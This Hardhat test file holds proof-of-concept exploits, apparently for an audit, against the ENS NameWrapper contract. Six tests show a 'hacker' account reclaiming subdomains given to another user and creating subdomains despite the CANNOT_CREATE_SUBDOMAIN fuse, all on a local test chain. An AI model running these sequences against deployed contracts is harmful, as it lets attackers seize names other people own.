const { ethers } = require('hardhat')
const { use, expect } = require('chai')
const { solidity } = require('ethereum-waffle')
const { labelhash, namehash, encodeName, FUSES } = require('../test-utils/ens')
const { evm } = require('../test-utils')
const { shouldBehaveLikeERC1155 } = require('./ERC1155.behaviour')
const { shouldSupportInterfaces } = require('./SupportsInterface.behaviour')
const { shouldRespectConstraints } = require('./Constraints.behaviour')
const { ZERO_ADDRESS } = require('@openzeppelin/test-helpers/src/constants')
const { deploy } = require('../test-utils/contracts')
const { EMPTY_BYTES32, EMPTY_ADDRESS } = require('../test-utils/constants')

const abiCoder = new ethers.utils.AbiCoder()

use(solidity)

const ROOT_NODE = EMPTY_BYTES32

const DUMMY_ADDRESS = '0x0000000000000000000000000000000000000001'
const DAY = 86400
const GRACE_PERIOD = 90 * DAY

function increaseTime(delay) {
  return ethers.provider.send('evm_increaseTime', [delay])
}

function mine() {
  return ethers.provider.send('evm_mine')
}

const {
  CANNOT_UNWRAP,
  CANNOT_BURN_FUSES,
  CANNOT_TRANSFER,
  CANNOT_SET_RESOLVER,
  CANNOT_SET_TTL,
  CANNOT_CREATE_SUBDOMAIN,
  PARENT_CANNOT_CONTROL,
  CAN_DO_EVERYTHING,
  IS_DOT_ETH,
} = FUSES

describe('Name Wrapper', () => {
  let ENSRegistry
  let ENSRegistry2
  let ENSRegistryH
  let BaseRegistrar
  let BaseRegistrar2
  let BaseRegistrarH
  let NameWrapper
  let NameWrapper2
  let NameWrapperH
  let NameWrapperUpgraded
  let MetaDataservice
  let signers
  let accounts
  let account
  let account2
  let hacker
  let result
  let MAX_EXPIRY = 2n ** 64n - 1n

  /* Utility funcs */

  async function registerSetupAndWrapName(label, account, fuses) {
    const tokenId = labelhash(label)

    await BaseRegistrar.register(tokenId, account, 1 * DAY)

    await BaseRegistrar.setApprovalForAll(NameWrapper.address, true)

    await NameWrapper.wrapETH2LD(label, account, fuses, EMPTY_ADDRESS)
  }

  before(async () => {
    signers = await ethers.getSigners()
    account = await signers[0].getAddress()
    account2 = await signers[1].getAddress()
    hacker = await signers[2].getAddress()

    EnsRegistry = await deploy('ENSRegistry')
    EnsRegistry2 = EnsRegistry.connect(signers[1])
    EnsRegistryH = EnsRegistry.connect(signers[2])

    BaseRegistrar = await deploy(
      'BaseRegistrarImplementation',
      EnsRegistry.address,
      namehash('eth'),
    )

    BaseRegistrar2 = BaseRegistrar.connect(signers[1])
    BaseRegistrarH = BaseRegistrar.connect(signers[2])

    await BaseRegistrar.addController(account)
    await BaseRegistrar.addController(account2)

    MetaDataservice = await deploy(
      'StaticMetadataService',
      'https://ens.domains',
    )

    NameWrapper = await deploy(
      'NameWrapper',
      EnsRegistry.address,
      BaseRegistrar.address,
      MetaDataservice.address,
    )
    NameWrapper2 = NameWrapper.connect(signers[1])
    NameWrapperH = NameWrapper.connect(signers[2])

    NameWrapperUpgraded = await deploy(
      'UpgradedNameWrapperMock',
      NameWrapper.address,
      EnsRegistry.address,
      BaseRegistrar.address,
    )

    // setup .eth
    await EnsRegistry.setSubnodeOwner(
      ROOT_NODE,
      labelhash('eth'),
      BaseRegistrar.address,
    )

    // setup .xyz
    await EnsRegistry.setSubnodeOwner(ROOT_NODE, labelhash('xyz'), account)

    //make sure base registrar is owner of eth TLD
    expect(await EnsRegistry.owner(namehash('eth'))).to.equal(
      BaseRegistrar.address,
    )
  })

  beforeEach(async () => {
    result = await ethers.provider.send('evm_snapshot')
  })
  afterEach(async () => {
    await ethers.provider.send('evm_revert', [result])
  })

  describe('PoC', () => {
    const label1 = 'sub1'
    const labelHash1 = labelhash('sub1')
    const wrappedTokenId1 = namehash('sub1.eth')

    const label2 = 'sub2'
    const labelHash2 = labelhash('sub2')
    const wrappedTokenId2 = namehash('sub2.sub1.eth')

    const label3 = 'sub3'
    const labelHash3 = labelhash('sub3')
    const wrappedTokenId3 = namehash('sub3.sub2.sub1.eth')

    const label4 = 'sub4'
    const labelHash4 = labelhash('sub4')
    const wrappedTokenId4 = namehash('sub4.sub3.sub2.sub1.eth')

    before(async () => {
      await BaseRegistrar.addController(NameWrapper.address)
      await NameWrapper.setController(account, true)
    })

    it('reclaim ownership - hack 1', async () => {
      // step 1. sub1.eth to hacker
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        10 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)

      // step 2. create sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 3. create sub3.sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)

      // step 4. unwrap sub2.sub1.eth
      await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)
      
      // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)
      
      // step 6. re-wrap sub2.sub1.eth
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn PARENT_CANNOT_CONTRL
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId2, 
        label3,
        account2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner1).to.equal(account2)
      expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)

      // HACK: regain sub3.sub2.sub1.eth by wrap
      await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner2).to.equal(hacker)
      expect(fuses2).to.equal(PARENT_CANNOT_CONTROL)
    })

    it('reclaim ownership - hack 2', async () => {
      // step 1. sub1.eth to hacker
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        10 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)

      // step 2. create sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 3. create sub3.sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)

      // step 4. unwrap sub2.sub1.eth
      await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)
      
      // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)
      
      // step 6. re-wrap sub2.sub1.eth
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn PARENT_CANNOT_CONTRL
      // by setChildFuse 
      await NameWrapperH.setChildFuses(
        wrappedTokenId2, 
        labelHash3,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 9. safeTransferFrom to account2
      await NameWrapperH.safeTransferFrom(hacker, account2, wrappedTokenId3, 1, "0x")

      let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner1).to.equal(account2)
      expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)

      // HACK: regain sub3.sub2.sub1.eth by wrap
      await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner2).to.equal(hacker)
      expect(fuses2).to.equal(PARENT_CANNOT_CONTROL)
    })

    it('reclaim ownership - hack 3', async () => {
      // step 1. sub1.eth to hacker
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        10 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)

      // step 2. create sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 3. create sub3.sub2.sub1.eth to account2 without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, account2, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(account2)

      // step 4. unwrap sub2.sub1.eth
      await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)
      
      // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)
      
      // step 6. re-wrap sub2.sub1.eth
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn PARENT_CANNOT_CONTRL
      // by setChildFuses
      await NameWrapperH.setChildFuses(
        wrappedTokenId2, 
        labelHash3,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner1).to.equal(account2)
      expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)

      // HACK: regain sub3.sub2.sub1.eth by wrap
      await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner2).to.equal(hacker)
      expect(fuses2).to.equal(PARENT_CANNOT_CONTROL)
    })

    it('violate CANNOT_CREATE_SUBDOMAIN - hack 1', async () => {
      // step 1. sub1.eth to hacker
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        10 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)

      // step 2. create sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 3. create sub3.sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)

      // step 4. unwrap sub2.sub1.eth
      await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)
      
      // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)
      
      // step 6. re-wrap sub2.sub1.eth
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn CANNOT_CREATE_SUBDOMAIN
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId2, 
        label3,
        account2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN,
        MAX_EXPIRY
      )

      let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner1).to.equal(account2)
      expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN)

      // HACK: create sub4.ub3.sub2.sub1.eth 
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId3, labelHash4, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId4)).to.equal(hacker)

      await NameWrapperH.wrap(encodeName('sub4.sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId4)
      expect(owner2).to.equal(hacker)
      expect(fuses2).to.equal(CAN_DO_EVERYTHING)
    })

    it('violate CANNOT_CREATE_SUBDOMAIN - hack 2', async () => {
      // step 1. sub1.eth to hacker
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        10 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)

      // step 2. create sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 3. create sub3.sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)

      // step 4. unwrap sub2.sub1.eth
      await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)
      
      // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)
      
      // step 6. re-wrap sub2.sub1.eth
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn CANNOT_CREATE_SUBDOMAIN
      // by setChildFuse 
      await NameWrapperH.setChildFuses(
        wrappedTokenId2, 
        labelHash3,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN,
        MAX_EXPIRY
      )

      // step 9. safeTransferFrom to account2
      await NameWrapperH.safeTransferFrom(hacker, account2, wrappedTokenId3, 1, "0x")

      let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner1).to.equal(account2)
      expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN)

      // HACK: create sub4.ub3.sub2.sub1.eth 
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId3, labelHash4, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId4)).to.equal(hacker)

      await NameWrapperH.wrap(encodeName('sub4.sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId4)
      expect(owner2).to.equal(hacker)
      expect(fuses2).to.equal(CAN_DO_EVERYTHING)
    })

    it('violate CANNOT_CREATE_SUBDOMAIN - hack 3', async () => {
      // step 1. sub1.eth to hacker
      await NameWrapper.registerAndWrapETH2LD(
        label1,
        hacker,
        10 * DAY,
        EMPTY_ADDRESS,
        CANNOT_UNWRAP
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)

      // step 2. create sub2.sub1.eth to hacker without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 3. create sub3.sub2.sub1.eth to account2 without fuses
      await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, account2, 0, 0)
      expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(account2)

      // step 4. unwrap sub2.sub1.eth
      await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)
      
      // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)
      
      // step 6. re-wrap sub2.sub1.eth
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)

      // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP
      await NameWrapperH.setChildFuses(
        wrappedTokenId1,
        labelHash2, 
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )

      // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn CANNOT_CREATE_SUBDOMAIN
      await NameWrapperH.setChildFuses(
        wrappedTokenId2, 
        labelHash3,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN,
        MAX_EXPIRY
      )

      let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)
      expect(owner1).to.equal(account2)
      expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN)

      // HACK: create sub4.ub3.sub2.sub1.eth 
      await EnsRegistryH.setSubnodeOwner(wrappedTokenId3, labelHash4, hacker)
      expect(await EnsRegistry.owner(wrappedTokenId4)).to.equal(hacker)

      await NameWrapperH.wrap(encodeName('sub4.sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)
      let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId4)
      expect(owner2).to.equal(hacker)
      expect(fuses2).to.equal(CAN_DO_EVERYTHING)
    })
  })
})
